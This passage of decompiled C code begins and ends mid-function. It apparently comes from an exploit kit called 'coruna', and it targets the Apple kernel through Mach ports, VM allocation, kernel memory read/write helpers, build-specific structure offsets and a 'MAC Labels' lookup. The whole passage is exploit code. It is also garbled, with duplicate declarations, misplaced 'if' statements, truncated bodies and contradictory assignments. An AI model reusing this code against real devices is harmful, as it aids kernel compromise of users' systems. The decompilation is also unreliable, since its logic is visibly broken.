  if (version == 0) {
    return;
  }
  if (version <= kind) {
    version = *(uint *)(handle + 0x180);
    u = 0;
    if (version != 0) {
      u = kind / version;
    }
    err = kind - u * version;
    status = 0;
    if (err != 0) {
      status = version - err;
    }
    kind = status + kind;
  }
  version = *(uint *)(handle + 0x168);
  if (kind < version * 0x3fff) {
    thread_attr = (unsigned long)thread_attr << 0x20;
    u = 0;
    if (version != 0) {
      u = kind / version;
    }
    err = kind - u * version;
    status = 0;
    if (err != 0) {
      status = version - err;
    }
    lk8 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,
                                (mach_port_name_t *)&thread_attr);
    if (lk8 != 0) {
next:
      off = 0;
      if ((off != 0) && (kind != *size)) {
      *size = kind;
      }
      return;
    }
    version = status + kind;
    ptr = _calloc((unsigned long)version,1);
    if (ptr == (void *)0x0) {
      off = 0;
      if ((off != 0) && (kind != *size)) {
        *size = kind;
      }
      return;
    }
    u = *(uint *)(handle + 0x168);
    size = 0;
    if (u != 0) {
      size = version / u;
    }
    if (version == size * u) {
      tag = thread_attr & 0xffffffff;
      status = coruna_kernel5_residual_246(action);
      if (status != 0) {
        _free(ptr);
        off = 0;
        if ((off != 0) && (kind != *size)) {
          *size = kind;
        }
        return;
      }
      u = 0;
      if (*(uint *)(handle + 0x168) != 0) {
        u = version / *(uint *)(handle + 0x168);
      }
      status = coruna_kernel509_via_kernel5_residual_249_2(action,ptr,u);
      if (status == 0) {
        status = coruna_mach_msg(action,0,tag,0);
        coruna_kernel5_residual_247(action);
        if (status != 0) {
          _free(ptr);
          off = 0;
          if ((off != 0) && (kind != *size)) {
            *size = kind;
          }
          return;
        }
        handle = coruna_kernel509_via_kernel509_via_kernel509_via_helper_24abc_36410(handle,thread_attr & 0xffffffff);
        off = 0;
        if (handle != 0) {
          status = coruna_kernel509_residual_307(handle,handle + 0x24,action);
          if ((status == 0) || (off = coruna_fn_ptr_cast_2(handle,action[0]), off == 0)) {
            _free(ptr);
            off = 0;
            if ((off != 0) && (kind != *size)) {
              *size = kind;
            }
            return;
          }
          status = coruna_mach_vm_machine_attribute(handle,handle + 0x20,0);
          off = 0;
          if (status != 0) {
            off = action[0];
          }
        }
        if ((off != 0) && (kind != *size)) {
          *size = kind;
        }
        return;
      }
again:
      coruna_kernel5_residual_247(action);
    }
    _free(ptr);
    off = 0;
    if ((off != 0) && (kind != *size)) {
      *size = kind;
    }
    return;
  }
  thread_attr = (unsigned long)thread_attr << 0x20;
  lk8 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,
                              (mach_port_name_t *)&thread_attr);
  return;
}
void coruna_vm_deallocate_2a1cc(uint64_t val,uint *size)
{
  uint8_t *ptr;
  uint u;
  kern_return_t lk3;
  int err;
  long handle;
  unsigned long size;
  vm_address_t scratch;
  uint bootargs;
  
  bootargs = *size;
  handle = coruna_mach_port_request_notification_29a50(val,&bootargs);
  u = bootargs;
  ptr = k_kernel_mach_task_self_slot;
  if (handle != 0) {
    scratch = 0;
    size = (unsigned long)bootargs;
    lk3 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,size,1);
    if (lk3 == 0) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(val,handle,scratch,size);
      if (err != 0) {
        if (u != *size) {
          *size = u;
        }
        _vm_deallocate(*(vm_map_t *)ptr,scratch,size);
        return;
      }
      _vm_deallocate(*(vm_map_t *)ptr,scratch,size);
    }
    coruna_mach_port_allocate(val,handle,size);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_4(uint *size,uint64_t val,uint64_t id_2,int flags,uint16_t arg
                 )
{
  int err;
  long handle;
  long addr;
  uint scratch;
  uint bootargs;
  uint thread_attr;
  uint host_info;
  uint serial_buf;
  uint action;
  long block_ctx;
  uint64_t stack_guard;
  uint16_t sa_saved;
  
  block_ctx = 0;
  stack_guard = 0;
  if (((((*size & 0x5584201) != 0) &&
       (sa_saved = arg, err = coruna_kernel5_residual_271(size,&action,&serial_buf,&host_info,&thread_attr),
       err == 0)) && (err = coruna_kernel5_via_mach_port_deallocate_2753c(size,id_2,&stack_guard), err == 0)) &&
     (handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(size,val), handle != 0)) {
    err = coruna_kernel509_residual_307(size,handle + (unsigned long)action,&block_ctx);
    if (((err != 0) && ((block_ctx == 0 || (addr = coruna_fn_ptr_cast_2(size), addr != 0)))) &&
       (err = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(size,handle + (unsigned long)action,stack_guard), err != 0)) {
      if (flags != 0) {
        err = coruna_kernel509_via_mach_vm_read_overwrite(size,handle + (unsigned long)serial_buf,&bootargs);
        if (err == 0) {
          return;
        }
        if (3 < bootargs) {
          return;
        }
        err = coruna_kernel509_via_mach_vm_read_overwrite(size,handle + (unsigned long)host_info,&scratch);
        if (err == 0) {
          return;
        }
        if (12000000 < scratch) {
          return;
        }
        err = coruna_mach_vm_machine_attribute(size,handle + (unsigned long)serial_buf,1);
        if (err == 0) {
          return;
        }
        err = coruna_mach_vm_machine_attribute(size,handle + (unsigned long)host_info,12000000);
        if (err == 0) {
          return;
        }
      }
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(size,handle + (unsigned long)thread_attr,2,&bootargs);
      if ((err != 0) && ((ushort)bootargs < 0x80)) {
        coruna_call_mach_vm_machine_attribute_1d4f8_2b614(size,handle + (unsigned long)thread_attr,&sa_saved,2);
      }
    }
  }
  return;
}
void coruna_kernel5_residual_271(uint *size,uint *flags_2,int *flags,int *count_2,int *fd_3)
{
  bool err;
  bool status;
  int err;
  int status;
  uint u;
  uint size;
  int flags;
  uint version;
  int count;
  unsigned long port;
  int idx;
  
  size = 0x5584001;
  port = *(unsigned long *)(size + 0x56);
  version = *size;
  if (0x44a < port >> 0x2b) {
    size = 0x5584201;
  }
  if ((version & size) == 0) {
    return;
  }
  size = size[0x50];
  if ((int)size < 0x2258) {
    if (size - 0x1f53 < 2) {
      if ((version >> 0x14 & 1) == 0) {
        flags = 0x16c;
        if (port < 0x1f530f02800000) {
          flags = 0x170;
        }
        size = 0x210;
        if (port < 0x1f530f02800000) {
          size = 0x280;
        }
        count = 0x1b4;
        if (port < 0x1f530f02800000) {
          count = 0x224;
        }
        status = 0x174;
        if (port < 0x1f530f02800000) {
          status = 0x178;
        }
        u = 0x218;
        if (port < 0x1f530f02800000) {
          u = 0x288;
        }
        idx = 0x1bc;
        if (port < 0x1f530f02800000) {
          idx = 0x22c;
        }
        status = (version & 0x84000) != 0;
        if (status) {
          count = idx;
          flags = status;
          size = u;
        }
        status = 0x184;
        if (status) {
          status = 0x18c;
        }
        *flags_2 = size;
        *flags = flags;
        *count_2 = count;
        *fd_3 = status;
        return;
      }
      err = 0x1f530f027ffffe < port;
      status = port == 0x1f530f027fffff;
      flags = 0x17c;
      if (port < 0x1f530f02800000) {
        flags = 0x180;
      }
      size = 0x220;
      if (port < 0x1f530f02800000) {
        size = 0x290;
      }
      count = 0x1c4;
      if (port < 0x1f530f02800000) {
        count = 0x230;
      }
      idx = 400;
      status = 0x194;
    }
    else {
      if (size != 0x1809) {
        if (size != 0x1c1b) {
          return;
        }
        status = (version & 0x84000) != 0;
        version = 0x280;
        if (status) {
          version = 0x288;
        }
        status = 0x16c;
        if (status) {
          status = 0x174;
        }
        idx = 0x22c;
        if (status) {
          idx = 0x234;
        }
        err = 0x184;
        if (status) {
          err = 0x18c;
        }
        status = 0x1c1b19145fffff < port;
        size = 0x1c0;
        if (status) {
          size = version;
        }
        count = 0x16c;
        flags = 0xac;
        if (status) {
          count = idx;
          flags = status;
        }
        status = 0xc4;
        if (status) {
          status = err;
        }
        *flags_2 = size;
        *flags = flags;
        *count_2 = count;
        *fd_3 = status;
        return;
      }
      err = 0x18090a095ffffe < port;
      status = port == 0x18090a095fffff;
      size = 0x1a0;
      if (port < 0x18090a09600000) {
        size = 0x1a8;
      }
      flags = 0xa4;
      if (port < 0x18090a09600000) {
        flags = 0xac;
      }
      count = 0x14c;
      if (port < 0x18090a09600000) {
        count = 0x154;
      }
      idx = 0xc4;
      status = 0xbc;
    }
    if (!err || status) {
      status = idx;
    }
    *flags_2 = size;
    *flags = flags;
    *count_2 = count;
    *fd_3 = status;
    return;
  }
  if ((size != 0x2258) && (size != 0x225c)) {
    if (size != 0x2712) {
      return;
    }
    version = version & 0x518e241;
    if (version < 0x100000) {
      if (version == 1) {
        version = 0;
      }
      else {
        if ((version != 0x4000) && (version != 0x80000)) {
          return;
        }
        version = 0x10;
      }
    }
    else if ((version == 0x100000) || (version == 0x1000000)) {
      version = 0x18;
    }
    else {
      if (version != 0x4000000) {
        return;
      }
      version = 0x68;
    }
    size = version | 0x200;
    flags = version + 0x164;
    count = version + 0x1b4;
    status = version + 0x17c;
    *flags_2 = size;
    *flags = flags;
    *count_2 = count;
    *fd_3 = status;
    return;
  }
  version = version & 0x518e241;
  if (version < 0x80000) {
    if (version == 1) {
      status = 0x10;
    }
    else {
      if (version != 0x200) {
        if (version != 0x4000) {
          return;
        }
        goto done;
      }
      status = 0;
    }
  }
  else if (version == 0x80000) {
done:
    status = 0x20;
  }
  else {
    if ((version != 0x100000) && (version != 0x1000000)) {
      return;
    }
    status = 0x28;
  }
  size = status + 0x1e8;
  flags = status + 0x154;
  count = status + 0x19c;
  status = status + 0x16c;
fail:
  *flags_2 = size;
  *flags = flags;
  *count_2 = count;
  *fd_3 = status;
  return;
}
void coruna_kernel5_via_mach_port_deallocate_2753c(long handle,int flags,uint64_t *val)
{
  long handle;
  uint64_t u;
  uint scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  bootargs = 0;
  thread_attr = 0;
  bootargs = 0;
  scratch = 4;
  if ((*(long *)(handle + 0x248) == 0) || (*(long *)(handle + 0x250) == 0)) {
    u = coruna_mach_port_deallocate_2753c(handle,2,&bootargs,&scratch);
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
    }
    ___stack_chk_fail(u);
  }
  u = 0;
  handle = 0x248;
  if (flags == 0) {
    handle = 0x250;
  }
  *val = *(uint64_t *)(handle + handle);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}
void coruna_kernel509_via_fn_ptr_cast_2_15(uint *size,long handle,uint64_t val,int flags,uint16_t arg)
{
  int err;
  long handle;
  uint scratch;
  uint bootargs;
  uint thread_attr;
  uint host_info;
  uint64_t serial_buf;
  
  serial_buf = 0;
  if (((((*size & 0x5584201) != 0) &&
       (err = coruna_kernel5_residual_271(size,&host_info,&thread_attr,&bootargs,&scratch), err == 0)) &&
      (err = coruna_kernel5_via_mach_port_deallocate_2753c(size,val,&serial_buf), err == 0)) &&
     ((*(long *)(handle + (unsigned long)host_info) == 0 || (handle = coruna_fn_ptr_cast_2(size), handle != 0)))) {
    *(uint64_t *)(handle + (unsigned long)host_info) = serial_buf;
    if (flags != 0) {
      if (3 < *(uint *)(handle + (unsigned long)thread_attr)) {
        return;
      }
      if (12000000 < *(uint *)(handle + (unsigned long)bootargs)) {
        return;
      }
      *(uint32_t *)(handle + (unsigned long)thread_attr) = 1;
      *(uint32_t *)(handle + (unsigned long)bootargs) = 12000000;
    }
    if (*(ushort *)(handle + (unsigned long)scratch) < 0x80) {
      *(uint16_t *)(handle + (unsigned long)scratch) = arg;
    }
  }
  return;
}
void coruna_vm_deallocate_39520(uint *size,unsigned long arg,uint64_t val,int flags,uint16_t arg_x)
{
  long handle;
  uint u;
  uint8_t *ptr;
  int err;
  kern_return_t lk5;
  long addr;
  unsigned long size;
  uint32_t scratch;
  uint32_t bootargs;
  uint thread_attr;
  uint host_info;
  uint serial_buf;
  uint action;
  vm_address_t block_ctx [2];
  uint16_t stack_guard;
  
  block_ctx[0] = 0;
  block_ctx[1] = 0;
  if ((*size & 0x5584201) == 0) {
    return;
  }
  stack_guard = arg_x;
  err = coruna_kernel5_residual_271(size,&action,&serial_buf,&host_info,&thread_attr);
  if (err != 0) {
    return;
  }
  err = coruna_kernel5_via_mach_port_deallocate_2753c(size,val,block_ctx + 1);
  ptr = k_kernel_mach_task_self_slot;
  if (err != 0) {
    return;
  }
  u = size[0x60];
  size = (unsigned long)u;
  lk5 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,block_ctx,size,1);
  if ((lk5 == 0) &&
     (err = coruna_kernel509_via_mach_port_deallocate_2b24c_2(size,arg & (*(unsigned long *)(size + 0x62) ^ 0xffffffffffffffff),
                           block_ctx[0],size,1), err == 0)) {
    handle = (*(unsigned long *)(size + 0x62) & arg) + block_ctx[0];
    if (((*(long *)(handle + (unsigned long)action) == 0) || (addr = coruna_fn_ptr_cast_2(size), addr != 0))
       && (err = coruna_kernel509_via_mach_port_deallocate_2b24c_3(size,action + arg,block_ctx + 1,size[0x5a],1), err == 0
          )) {
      if (flags != 0) {
        if ((3 < *(uint *)(handle + (unsigned long)serial_buf)) ||
           if ((block_ctx[0] != 0) && (u != 0)) {
           _vm_deallocate(*(vm_map_t *)ptr,block_ctx[0],size);
           }
           return;
      }
      if (*(ushort *)(handle + (unsigned long)thread_attr) < 0x80) {
        coruna_kernel509_via_mach_port_deallocate_2b24c_3(size,thread_attr + arg,&stack_guard,2,1);
      }
    }
  }
fail:
  if ((block_ctx[0] != 0) && (u != 0)) {
    _vm_deallocate(*(vm_map_t *)ptr,block_ctx[0],size);
  }
  return;
}
void coruna_kernel509_residual_314(long handle,uint64_t val,uint64_t id_2,unsigned long arg)
{
  int err;
  unsigned long u;
  long *ptr;
  
  if ((0x1808 < *(int *)(handle + 0x140)) &&
     (((*(long *)(&k_kernel_slot_1a18 + handle) != 0 || (err = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_9(handle), err == 0)) &&
      (u = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + handle), *(uint *)(&k_kernel_slot_18a0 + handle) != 0)))
     ) {
    ptr = (long *)(&k_kernel_slot_1a18 + handle);
    do {
      if (((unsigned long)ptr[-2] <= arg) && (arg < (unsigned long)(*ptr + ptr[-2]))) {
        return;
      }
      ptr = ptr + 3;
      u = u - 1;
    } while (u != 0);
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_9(uint *size)
{
  long handle;
  long addr;
  int err;
  uint64_t u;
  long off;
  long base;
  unsigned long size;
  unsigned long scratch;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  off = *(long *)(size + 0x626);
  if (off == 0) {
    scratch = scratch & 0xffffffff00000000;
    off = coruna_kernel509_via_helper_127b4_1b298_stub(*(uint64_t *)(size + 0x67e),&scratch);
    if (off == 0 || (uint)scratch == 0) {
      u = 0xad011;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
    *(long *)(size + 0x626) = off;
    size[0x628] = (uint)scratch;
done:
    base = 0;
    size = 0;
    do {
      scratch = 0;
      scratch = 0;
      bootargs = 0;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(size,off + base,0x18,&scratch);
      if (err == 0) {
        u = 0x2800f;
        if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
        return;
        }
        ___stack_chk_fail(u);
      }
      addr = bootargs;
      if ((*size & 0x20) != 0) {
        addr = bootargs << 0xe;
      }
      handle = (long)size + base;
      *(unsigned long *)(&k_kernel_slot_1a08 + handle) = scratch;
      *(uint64_t *)(&k_kernel_slot_1a10 + handle) = scratch;
      *(long *)(&k_kernel_slot_1a18 + handle) = addr;
      size = size + 1;
      base = base + 0x18;
    } while (size < size[0x628]);
  }
  else if (size[0x628] != 0) goto done;
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}
void coruna_helper_2a918_3996c(long handle,uint64_t val,uint64_t id_2,unsigned long arg)
{
  int err;
  unsigned long u;
  long *ptr;
  
  if ((0x1808 < *(int *)(handle + 0x140)) &&
     (((*(long *)(&k_kernel_slot_1a18 + handle) != 0 || (err = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_9(handle), err == 0)) &&
      (u = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + handle), *(uint *)(&k_kernel_slot_18a0 + handle) != 0)))
     ) {
    ptr = (long *)(&k_kernel_slot_1a18 + handle);
    do {
      if (((unsigned long)ptr[-1] <= arg) && (arg < (unsigned long)(*ptr + ptr[-1]))) {
        return;
      }
      ptr = ptr + 3;
      u = u - 1;
    } while (u != 0);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_11(long handle,uint64_t val)
{
  int err;
  long handle;
  uint64_t scratch;
  long bootargs;
  
  scratch = 0;
  bootargs = 0;
  if (*(long *)(&k_kernel_slot_18a8 + handle) == 0) {
    handle = coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle);
    if (handle == 0) {
      return;
    }
    handle = coruna_kernel509_via_fn_ptr_cast_2_11(handle,handle);
    if (handle == 0) {
      return;
    }
    err = coruna_kernel509_residual_307(handle,handle,&bootargs);
    if (err == 0) {
      return;
    }
    err = coruna_kernel509_residual_307(handle,handle + *(int *)(handle + 0x168),&scratch);
    if (err == 0) {
      return;
    }
    *(long *)(&k_kernel_slot_18a8 + handle) = bootargs;
    *(uint64_t *)(&k_kernel_slot_18b0 + handle) = scratch;
  }
  else {
    scratch = *(uint64_t *)(&k_kernel_slot_18b0 + handle);
    bootargs = *(long *)(&k_kernel_slot_18a8 + handle);
  }
  coruna_helper_2a918_3996c(handle,bootargs,scratch,val);
  return;
}
void coruna_helper_2abf4_39b14(long handle,uint64_t val)
{
  int err;
  long handle;
  uint64_t scratch;
  long bootargs;
  
  scratch = 0;
  bootargs = 0;
  if (*(long *)(&k_kernel_slot_18a8 + handle) == 0) {
    handle = coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle);
    if (handle == 0) {
      return;
    }
    handle = coruna_kernel509_via_fn_ptr_cast_2_11(handle,handle);
    if (handle == 0) {
      return;
    }
    err = coruna_kernel509_residual_307(handle,handle,&bootargs);
    if (err == 0) {
      return;
    }
    err = coruna_kernel509_residual_307(handle,handle + *(int *)(handle + 0x168),&scratch);
    if (err == 0) {
      return;
    }
    *(long *)(&k_kernel_slot_18a8 + handle) = bootargs;
    *(uint64_t *)(&k_kernel_slot_18b0 + handle) = scratch;
  }
  else {
    scratch = *(uint64_t *)(&k_kernel_slot_18b0 + handle);
    bootargs = *(long *)(&k_kernel_slot_18a8 + handle);
  }
  coruna_kernel509_residual_314(handle,bootargs,scratch,val);
  return;
}
void coruna_kernel5_via_mach_port_allocate(long handle)
{
  long handle;
  uint u;
  uint size;
  unsigned long version;
  long addr;
  uint64_t port;
  long scratch;
  int bootargs [32];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs[0x18] = 0;
  bootargs[0x19] = 0;
  bootargs[0x16] = 0;
  bootargs[0x17] = 0;
  bootargs[0x1c] = 0;
  bootargs[0x1d] = 0;
  bootargs[0x1a] = 0;
  bootargs[0x1b] = 0;
  bootargs[0x10] = 0;
  bootargs[0x11] = 0;
  bootargs[0xe] = 0;
  bootargs[0xf] = 0;
  bootargs[0x14] = 0;
  bootargs[0x15] = 0;
  bootargs[0x12] = 0;
  bootargs[0x13] = 0;
  bootargs[8] = 0;
  bootargs[9] = 0;
  bootargs[6] = 0;
  bootargs[7] = 0;
  bootargs[0xc] = 0;
  bootargs[0xd] = 0;
  bootargs[10] = 0;
  bootargs[0xb] = 0;
  bootargs[0] = 0;
  bootargs[1] = 0;
  scratch = 0;
  bootargs[4] = 0;
  bootargs[5] = 0;
  bootargs[2] = 0;
  bootargs[3] = 0;
  size = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0x268));
  if (size == 0) {
    addr = 0;
    do {
      if ((*(long *)(handle + addr + 0x2b0) != 0) && (*(int *)(handle + addr + 0x2b8) != 0)) {
        handle = handle + addr;
        port = *(uint64_t *)(handle + 0x2b0);
        *(uint64_t *)((long)bootargs + addr) = *(uint64_t *)(handle + 0x2b8);
        *(uint64_t *)((long)bootargs + addr + -8) = port;
        *(uint64_t *)(handle + 0x2b8) = 0;
        *(uint64_t *)(handle + 0x2b0) = 0;
      }
      addr = addr + 0x10;
    } while (addr != 0x80);
    _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0x268));
    addr = 0;
    do {
      if (((*(long *)((long)bootargs + addr + -8) != 0) &&
          (*(int *)((long)bootargs + addr) != 0)) &&
         if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
         return;
         }
         ___stack_chk_fail(version);
    } while (addr != 0x80);
    version = 0;
  }
  else {
    u = -size;
    if (-1 < (int)size) {
      u = size;
    }
    version = (unsigned long)(u | 0x40000000);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(version);
}
void coruna_mach_make_memory_entry_2aed0(unsigned long arg,unsigned long arg,uint64_t *val)
{
  pthread_mutex_t *ptr;
  int err;
  uint32_t u;
  uint8_t *ptr;
  uint size;
  long handle;
  unsigned long version;
  long addr;
  long *ptr;
  long off;
  unsigned long port;
  vm_inherit_t in_stack_ffffffffffffff30;
  uint scratch;
  int bootargs;
  mem_entry_name_port_t thread_attr;
  unsigned long host_info;
  uint32_t *serial_buf;
  uint64_t action;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  val[6] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  ptr = k_kernel_mach_task_self_slot;
  serial_buf = (uint32_t *)0x0;
  port = *(unsigned long *)k_kernel_vm_page_size_slot;
  bootargs = 0;
  thread_attr = 0;
  err = *(int *)(arg + 0x140);
  version = arg;
  if (err < 0x2258) {
    if (*(long *)k_kernel_stack_chk_guard_slot == sa_saved) {
    return;
    }
    ___stack_chk_fail(version);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_saved) {
  return;
  }
  ___stack_chk_fail(version);
}
void coruna_mach_port_deallocate_2b24c(uint64_t val,vm_address_t *arg)
{
  uint8_t *ptr;
  int err;
  kern_return_t lk3;
  
  if ((((arg[2] != 0) && (*arg != 0)) &&
      (err = coruna_mach_vm_machine_attribute(val,arg[2] + (unsigned long)(uint)arg[6],0xffffffff),
      ptr = k_kernel_mach_task_self_slot, err != 0)) &&
     ((lk3 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*arg,
                              arg[1] * (unsigned long)*(uint *)((long)arg + 0x1c)), lk3 == 0 &&
      (lk3 = _mach_port_deallocate
                         (*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)arg + 0x34)),
      lk3 == 0)))) {
    coruna_kernel5_via_mach_port_allocate_2(val,arg[2],(int)arg[3]);
  }
  arg[6] = 0;
  arg[3] = 0;
  arg[2] = 0;
  arg[5] = 0;
  arg[4] = 0;
  arg[1] = 0;
  *arg = 0;
  return;
}
void coruna_kernel5_via_mach_port_allocate_2(long handle,long addr_2,uint64_t val)
{
  pthread_mutex_t *ptr;
  int err;
  unsigned long u;
  long *ptr;
  
  ptr = (pthread_mutex_t *)(handle + 0x268);
  err = _pthread_mutex_lock(ptr);
  if (err == 0) {
    u = (unsigned long)*(uint *)(handle + 0x2a8);
    if (*(uint *)(handle + 0x2a8) < 8) {
      ptr = (long *)(handle + u * 0x10 + 0x2b0);
      do {
        if (*ptr == 0) {
          *(int *)(handle + 0x2a8) = (int)u;
          *ptr = addr_2;
          *(int *)(handle + (u & 0xffffffff) * 0x10 + 0x2b8) = (int)val;
          _pthread_mutex_unlock(ptr);
          return;
        }
        u = u + 1;
        ptr = ptr + 2;
      } while (u != 8);
    }
    _pthread_mutex_unlock(ptr);
    if (addr_2 != 0) {
      coruna_mach_port_allocate(handle,addr_2,val);
    }
  }
  return;
}
void coruna_kernel509_via_mach_port_deallocate_2b24c_2(byte *arg,unsigned long arg_x,void *ctx,unsigned long arg,int flags)
{
  int err;
  long scratch [7];
  
  if (*(long *)(arg + 0x38) != 0) {
    coruna_kernel509_via_helper_5d2c_419fc_2(arg,arg_x,ctx,arg);
  }
  if ((flags != 0) &&
     (((*(unsigned long *)(arg + 0x158) < 0x27120f04b00003 || ((*arg >> 5 & 1) == 0)) &&
      (err = coruna_mach_make_memory_entry_2aed0(arg,arg_x,scratch), err == 0)))) {
    _memcpy(ctx,(void *)((*(unsigned long *)(arg + 0x188) & arg_x) + scratch[0]),
            arg & 0xffffffff);
    coruna_mach_port_deallocate_2b24c(arg,scratch);
  }
  return;
}
void coruna_kernel509_via_mach_port_deallocate_2b24c_3(byte *arg,unsigned long arg_x,void *ctx,unsigned long arg,int flags)
{
  int err;
  long scratch [7];
  
  if (*(long *)(arg + 0x48) != 0) {
    coruna_kernel509_via_helper_5d2c_419fc_2(arg,arg_x,ctx,arg);
  }
  if ((flags != 0) &&
     (((*(unsigned long *)(arg + 0x158) < 0x27120f04b00003 || ((*arg >> 5 & 1) == 0)) &&
      (err = coruna_mach_make_memory_entry_2aed0(arg,arg_x,scratch), err == 0)))) {
    _memcpy((void *)((*(unsigned long *)(arg + 0x188) & arg_x) + scratch[0]),ctx,
            arg & 0xffffffff);
    coruna_mach_port_deallocate_2b24c(arg,scratch);
  }
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_3(uint64_t val,long handle,uint64_t id_2)
{
  coruna_call_mach_vm_machine_attribute_1d4f8_2667c(val,handle + 8,2,id_2);
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_5(uint64_t val,long handle,uint16_t arg)
{
  uint16_t scratch;
  
  scratch = arg;
  coruna_call_mach_vm_machine_attribute_1d4f8_2b614(val,handle + 8,&scratch,2);
  return;
}
void coruna_fn_ptr_cast_11(void)
{
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_6(uint64_t val,long handle)
{
  bool err;
  ushort u;
  int err;
  long handle;
  ushort scratch;
  ushort bootargs;
  
  handle = coruna_fn_ptr_cast_2();
  if (handle != 0) {
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(val,handle + 8,2,&scratch);
    if ((err != 0) && (scratch < 0xfffe)) {
      u = scratch + 10;
      err = scratch < 0xfff5;
      scratch = 0xfffe;
      if (err) {
        scratch = u;
      }
      bootargs = scratch;
      coruna_call_mach_vm_machine_attribute_1d4f8_2b614(val,handle + 8,&bootargs,2);
    }
  }
  return;
}
void coruna_kernel509_via_helper_2abf4_39b14(long handle,unsigned long arg)
{
  int err;
  long handle;
  unsigned long u;
  unsigned long size;
  uint8_t scratch[32];
  unsigned long bootargs;
  
  size = *(unsigned long *)(handle + 0x188);
  u = arg & (size ^ 0xffffffffffffffff);
  if (((*(unsigned long *)(&k_kernel_slot_18b8 + handle) == 0 || *(unsigned long *)(&k_kernel_slot_18b8 + handle) != u) ||
      (*(long *)(&k_kernel_slot_18c0 + handle) == 0)) &&
     (err = coruna_call_mach_vm_machine_attribute_1d4f8_22818(handle,u,scratch), err != 0)) {
    handle = coruna_helper_2abf4_39b14(handle,bootargs & 0xffffffffc000);
    u = 0;
    if (handle != 0) {
      u = handle + (size & arg);
    }
    if (handle != 0 && u != 0) {
      size = *(unsigned long *)(handle + 0x188);
      *(unsigned long *)(&k_kernel_slot_18b8 + handle) = arg & (size ^ 0xffffffffffffffff);
      *(unsigned long *)(&k_kernel_slot_18c0 + handle) = u & (size ^ 0xffffffffffffffff);
    }
  }
  return;
}
void coruna_mach_port_deallocate_2b6c4(long *handle)
{
  task_t target_task;
  uint8_t *ptr;
  uint u;
  unsigned long size;
  bool err;
  int err;
  mach_port_t lm6;
  uint version;
  kern_return_t lk8;
  uint port;
  uint tag;
  long handle;
  unsigned long kind;
  long addr;
  long off;
  int *err;
  uint *buf;
  bool status;
  long base;
  uint64_t *str;
  long ctx_val;
  uint type_id;
  uint scratch;
  uint bootargs;
  long thread_attr;
  long host_info;
  uint64_t serial_buf;
  uint64_t action;
  mach_msg_type_number_t block_ctx;
  thread_act_array_t stack_guard;
  mach_port_name_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t tmp_buf;
  uint64_t host_info;
  uint64_t region[7];
  long plist;
  
  plist = *(long *)k_kernel_stack_chk_guard_slot;
  base = *handle;
  port = *(uint *)(handle + 1);
  sa_new = 0;
  sa_saved = 0;
  stack_guard = (thread_act_array_t)0x0;
  block_ctx = 0;
  target_task = *(task_t *)(&k_kernel_slot_18f8 + base);
  serial_buf = 0;
  action = 0xffffffffffffffff;
  scratch = 0xffffffffffffffff;
  path_buf = 0xffffffffffffffff;
  thread_attr = 0xffffffffffffffff;
  bootargs = 0xffffffffffffffff;
  host_info = 0xffffffffffffffff;
  tmp_buf = 0xffffffffffffffff;
  handle = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_3(base,"MAC Labels");
  kind = 0;
  if ((handle == 0) || (kind = coruna_macho_data_seg_40dec(base,handle), (int)kind != 0)) {
fail:
    port = 0;
